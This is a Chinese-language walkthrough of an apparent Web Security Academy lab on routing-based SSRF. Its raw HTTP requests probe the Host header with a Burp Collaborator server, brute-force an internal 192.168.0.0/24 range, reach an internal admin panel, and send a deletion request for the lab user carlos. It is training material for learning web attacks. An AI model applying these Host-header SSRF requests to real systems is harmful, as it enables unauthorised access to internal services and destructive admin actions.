# 实验：基于路由的 SSRF

本实验存在通过 Host 头进行基于路由的 SSRF 漏洞。你可以利用此漏洞访问位于内部 IP 地址上的不安全内网管理员面板。

为了解决本实验，请访问位于 `192.168.0.0/24` 网段内的内部管理员面板，然后删除用户 `carlos`。

> **注意**
> 为了防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。为了解决本实验，你必须使用 Burp Collaborator 的默认公共服务器。

## 步骤

探测
- 浏览主页
    ```http
    GET / HTTP/2
    Host: 0a0600e803ec7c8880bd80d3006600bc.web-security-academy.net
    ```

- 修改 Host 头部到带外服务器
    ```http
    GET / HTTP/2
    Host: s5y311xxh81jymusj2uniype359wxmlb.oastify.com
    ```

    - 服务器返回带外服务器响应
        ```http
        HTTP/2 200 OK
        Server: Burp Collaborator https://burpcollaborator.net/
        ```
    
    - 应用程序前端组件根据 Host 头部进行转发，作为代理

尝试暴破内网主机
- 发送到攻击器，取消勾选“使用目标更新 Host 头”复选框
    ```http
    GET / HTTP/2
    Host: 192.168.0.§0§
    ```
    - `192.168.0.0/24` 网段进行暴破

- 从大量 504 响应码中发现独特的 302
    ```http
    HTTP/2 302 Found
    Location: /admin
    ```

- 追踪重定向
    ```http
    GET /admin HTTP/2
    Host: 192.168.0.160
    ```

- 成功访问管理员端点
    ```html
    <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
        <input required type="hidden" name="csrf" value="BnPOyWAzziyeu9grqzX3LIaFCrlNfZxj">
        <label>
            Username
        </label>
        <input required type='text' name='username'>
        <button class='button' type='submit'>
            Delete user
        </button>
    </form>
    ```

- 根据表单，构造删除端点的 POST 请求

    ```http
    POST /admin/delete HTTP/2
    Host: 192.168.0.160

    username=carlos&csrf=BnPOyWAzziyeu9grqzX3LIaFCrlNfZxj
    ```

- 成功删除目标用户
